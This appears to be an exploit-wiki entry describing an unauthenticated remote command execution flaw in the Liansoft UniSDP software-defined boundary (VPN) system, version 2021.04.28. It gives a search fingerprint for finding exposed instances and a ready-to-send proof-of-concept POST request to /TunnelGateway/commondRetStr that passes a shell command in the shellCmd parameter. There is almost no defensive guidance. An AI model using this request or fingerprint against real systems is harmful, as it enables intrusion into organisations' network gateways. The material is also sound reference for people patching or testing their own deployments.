# UniSDP software-defined boundary system commonRetSt command execution vulnerability

## Vulnerability Description

Liansoft Security UniSDP software-defined boundary system is a next-generation VPN based on zero trust. In the 2021.04.28 version of this system, there is a security vulnerability in a TunnelGateway interface. The vulnerability allows an attacker to send a specially crafted request to the server and execute remote commands.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">UniSDP Software-defined Boundary System</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">title="UniSSOView"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1658977938174-b661802b-b5c7-434b-a5e7-6f51afb02db1-20230311204818783.png)

Verify POC

```php
POST /TunnelGateway/commondRetStr
  
shellCmd=id
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1658978044203-53489913-e30b-474a-accf-09c74a9189b7.png)